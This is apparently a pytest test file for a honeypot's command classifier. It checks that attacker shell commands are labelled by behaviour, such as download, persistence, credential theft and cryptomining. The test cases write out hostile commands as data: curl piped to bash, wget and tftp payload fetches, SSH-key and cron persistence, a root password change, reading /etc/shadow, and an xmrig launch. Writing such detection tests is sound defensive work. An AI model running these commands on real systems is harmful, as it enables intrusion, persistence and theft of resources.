import pytest

from honeytrap.detection.commands import classify, extract_urls, split_statements


def ids(command):
    return {b.behaviour_id for b in classify(command)}


@pytest.mark.parametrize("command,expected", [
    ("uname -a", {"sysinfo"}),
    ("cat /proc/cpuinfo | grep name | wc -l", {"sysinfo"}),
    ("whoami", {"user_discovery"}),
    ("cat /etc/passwd", {"account_discovery"}),
    ("ifconfig", {"network_config"}),
    ("ip addr", {"network_config"}),
    ("netstat -tulpn", {"network_connections"}),
    ("ps aux", {"process_discovery"}),
    ("ps aux | grep aliyun", {"process_discovery", "security_software"}),
    ("nmap -sS 10.0.0.0/24", {"network_service_scan"}),
    ("cat /etc/shadow", {"shadow_dump"}),
    ("grep -ri password /opt/app", {"credential_files"}),
    ("echo dW5hbWUK | base64 -d | sh", {"decode_payload", "pipe_to_shell"}),
    ("curl -fsSL http://198.51.100.2/i.sh | bash", {"download_tool", "pipe_to_shell"}),
    ("chmod +x /tmp/x", {"chmod_exec"}),
    ("chmod 777 bot", {"chmod_exec"}),
    ("./x86 ssh.root", {"exec_from_tmp"}),
    ("nohup /tmp/.x/miner &", {"exec_from_tmp"}),
    ("sh bot.sh", {"pipe_to_shell"}),
    ("wget http://198.51.100.2/a -O /tmp/a", {"download_tool"}),
    ("busybox tftp -g -r x 198.51.100.2", {"download_tool"}),
    ("echo ssh-rsa AAAA >> ~/.ssh/authorized_keys", {"ssh_key_persistence"}),
    ("(crontab -l; echo '* * * * * x') | crontab -", {"cron_persistence"}),
    ("useradd -m backup", {"account_creation"}),
    ("systemctl enable kworker", {"systemd_persistence"}),
    ("echo 'root:x' | chpasswd", {"password_change"}),
    ("history -c", {"history_clear"}),
    ("unset HISTFILE", {"history_disable"}),
    ("iptables -F", {"firewall_tamper"}),
    ("pkill -9 aliyun-service", {"security_tool_kill"}),
    ("./xmrig -o stratum+tcp://pool.example.invalid:3333", {"exec_from_tmp", "cryptominer"}),
])
def test_classification(command, expected):
    assert expected <= ids(command), ids(command)


@pytest.mark.parametrize("command,forbidden", [
    ("cat /etc/crontab", "cron_persistence"),   # reading cron is not persistence
    ("crontab -l", "cron_persistence"),
    ("cd /tmp/.x", "exec_from_tmp"),             # changing directory is not execution
    ("ls -la /tmp", "exec_from_tmp"),
    ("echo hello", "pipe_to_shell"),
    ("chmod 644 file", "chmod_exec"),
    ("cat README.md", "credential_files"),
])
def test_negative_cases(command, forbidden):
    assert forbidden not in ids(command)


def test_compound_command_yields_multiple_behaviours():
    found = ids("cd /tmp; wget http://198.51.100.5/a.sh; chmod +x a.sh; ./a.sh; rm -rf /tmp/a.sh")
    assert {"download_tool", "chmod_exec", "exec_from_tmp", "file_deletion"} <= found


def test_split_and_urls():
    assert split_statements("a; b && c || d") == ["a", "b", "c", "d"]
    assert split_statements("a | b") == ["a | b"]
    assert extract_urls("wget http://198.51.100.1/x;curl -O https://example.invalid/y.sh|sh") == [
        "http://198.51.100.1/x", "https://example.invalid/y.sh"]
